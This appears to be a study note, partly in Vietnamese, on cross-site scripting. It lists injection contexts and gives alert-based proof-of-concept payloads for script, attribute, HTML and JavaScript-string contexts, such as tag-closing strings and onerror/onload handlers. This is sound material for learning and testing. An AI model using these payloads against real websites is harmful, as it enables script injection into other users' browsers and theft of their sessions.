-  This is a web security vulnerability that allows an attacker to **insert and execute malicious JavaScript** into another user's browser.
- categories:
	- Non-persistent/Reflected XSS
	- Persistent/Stored XSS
	- DOM XSS

# Non-persistent/Reflected XSS
- Identify the Context:

| Context   | ex                      | inject             |
| --------- | ----------------------- | ------------------ |
| HTML      | `<div>input</div>`      | injetc tag         |
| Attribute | `<input value="input">` | break attribute    |
| JS        | var a="input"           | break string       |
| URL       | href="input"            | javascript: scheme |

## Script Context: 
- When the input is inside the tag: `script`
	- `<script>var name = "USER_INPUT";</script>`
	- Objective: Close the card `script`  Currently. Open a new tag to inject JS.
- Payload:

```HTML

</script><script>alert('XSS');</script>
```


```html
// Script Context:
</script><script>alert('XSS');</script>

/*
Khi input nằm bên trong thẻ <script>
<script>
var name = "USER_INPUT";
</script>

--> Đóng thẻ <script> hiện tại
--> - Mở thẻ mới để inject JS
*/
-------------------------
// Attribute Context:
" onmouseover="alert('XSS')"

/*
Input nằm trong attribute:
<input value="USER_INPUT">

--> - Inject event handler

event hay dùng: onmouseover, onerror, onclick, onfocus
" autofocus onfocus=alert(1)
*/
---------------------------
// HTML Context
<script>alert('XSS');</script>

/*
Input được render trực tiếp:
<div>USER_INPUT</div>
- 
- dùng thêm
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
*/
-------------------------

// Anchor Tag / JavaScript Context
'); alert('XSS'); //

/*
Input nằm trong JS:
<a href="javascript:doSomething('USER_INPUT')">

-
- Break khỏi string '
- Inject code
- Comment phần còn lại
--> doSomething(''); alert('XSS'); //')
*/


```

- link: https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
- 